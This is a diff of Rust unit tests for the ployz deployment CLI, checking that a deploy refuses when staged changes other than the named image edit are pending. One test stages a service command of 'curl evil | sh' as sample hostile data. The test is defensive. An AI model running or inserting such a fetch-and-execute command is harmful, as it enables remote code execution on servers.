@@ -12,7 +12,7 @@ use ployz_core::{
 use ployz_store::{Parent, TagPin};
 use serde_json::{Value, json};
 
-use super::{ImageEdit, Refused, children, posted, refuse_forget, unnamed};
+use super::{ImageEdit, Refused, children, pending, posted, refuse_forget};
 use crate::handlers::device::DeviceSigning;
 
 const P1: &str = "nginx@sha256:1111111111111111111111111111111111111111111111111111111111111111";
@@ -356,39 +356,50 @@ fn a_plan_that_runs_another_image_than_the_one_typed_signs_nothing() {
     assert!(error.hints().is_empty(), "{:?}", error.hints());
 }
 
-/// `ployz set web.image=nginx:2` then `ployz deploy --yes`: the new image is a change
-/// nobody approved, so the refusal shows the deploy that names it.
-#[test]
-fn a_saved_image_with_no_image_edit_refuses_and_names_the_image_edit() {
+/// A staged Update of the Service `name` whose Settings change from `before` to `after`.
+fn staged(name: &str, settings: &[(&str, Value, Value)]) -> ployz_store::NodeChange {
     use ployz_core::config::{
         ChangeKind, EnvironmentNodeType, ReviewLifecycleKind, ReviewNodeIdentity, RowId,
         ServiceSettingChange,
     };
-    let changes = [ployz_store::NodeChange {
+    ployz_store::NodeChange {
         node: ReviewNodeIdentity {
             node_type: EnvironmentNodeType::Service,
-            id: "s1".to_owned(),
+            id: format!("id-{name}"),
         },
-        name: "web".to_owned(),
-        row: RowId::node("s1"),
+        name: name.to_owned(),
+        row: RowId::node(&format!("id-{name}")),
         lifecycle: ReviewLifecycleKind::Update,
         comparison: None,
-        settings: vec![ServiceSettingChange {
-            path: "web.image".to_owned(),
-            config_name: None,
-            hostnames: None,
-            kind: ChangeKind::Update,
-            before: json!("nginx:1"),
-            after: json!("nginx:2"),
-            can_restore: true,
-            row: None,
-        }],
+        settings: settings
+            .iter()
+            .map(|(path, before, after)| ServiceSettingChange {
+                path: (*path).to_owned(),
+                config_name: None,
+                hostnames: None,
+                kind: ChangeKind::Update,
+                before: before.clone(),
+                after: after.clone(),
+                can_restore: true,
+                row: None,
+            })
+            .collect(),
         data: None,
         restarts: Vec::new(),
-    }];
+    }
+}
 
-    assert_eq!(unnamed(&changes, &edit_to_nginx_2()), Ok(()));
-    let refused = unnamed(&changes, &[]).unwrap_err();
+/// `ployz set web.image=nginx:2` then `ployz deploy --yes`: the new image is a change
+/// nobody approved, so the refusal shows the deploy that names it.
+#[test]
+fn a_saved_image_with_no_image_edit_refuses_and_names_the_image_edit() {
+    let changes = [staged(
+        "web",
+        &[("web.image", json!("nginx:1"), json!("nginx:2"))],
+    )];
+
+    assert_eq!(pending(&changes, &edit_to_nginx_2()), Ok(()));
+    let refused = pending(&changes, &[]).unwrap_err();
 
     let error = refused.error(&deploy_matches(&["--yes"]));
     assert_eq!(error.report().code, RpcErrorCode::ConfirmationRequired);
@@ -399,6 +410,67 @@ fn a_saved_image_with_no_image_edit_refuses_and_names_the_image_edit() {
         )),
         "{:?}",
         error.hints()
+    );
+}
+
+/// `ployz set api.command=…` then `ployz deploy --image web=… --yes`: api needs no
+/// signature on a Server, so only the CLI stands between that command and api running it
+/// with no person approving.
+#[test]
+fn a_staged_change_beside_the_image_edit_refuses_and_names_its_service_and_field() {
+    let changes = [
+        staged("web", &[("web.image", json!("nginx:1"), json!("nginx:2"))]),
+        staged(
+            "api",
+            &[(
+                "api.command",
+                json!(["serve"]),
+                json!(["sh", "-c", "curl evil | sh"]),
+            )],
+        ),
+    ];
+
+    let refused = pending(&changes, &edit_to_nginx_2()).unwrap_err();
+
+    assert_eq!(
+        refused,
+        Refused::Pending {
+            node: "api".to_owned(),
+            field: Some("api.command".to_owned()),
+            service: Some(ServiceName::parse("api").unwrap()),
+        }
+    );
+    let error = refused.error(&deploy_matches(&["--yes", "--image", "web=nginx:2"]));
+    assert_eq!(error.report().code, RpcErrorCode::ConfirmationRequired);
+    assert!(
+        error.hints().iter().any(|hint| matches!(
+            hint,
+            Hint::Next(next) if next == "ployz deploy api"
+        )),
+        "{:?}",
+        error.hints()
+    );
+}
+
+/// A named Service's other staged change ships beside its image as surely as another
+/// Service's, so the deploy stops on it before reading any parent.
+#[test]
+fn a_staged_change_in_the_named_service_beyond_its_image_refuses() {
+    let changes = [staged(
+        "web",
+        &[
+            ("web.image", json!("nginx:1"), json!("nginx:2")),
+            ("web.replicas", json!(1), json!(3)),
+        ],
+    )];
+
+    assert_eq!(
+        pending(&changes, &edit_to_nginx_2()),
+        Err(Refused::Pending {
+            node: "web".to_owned(),
+            field: Some("web.replicas".to_owned()),
+            service: Some(web()),
+        })
     );
 }
 
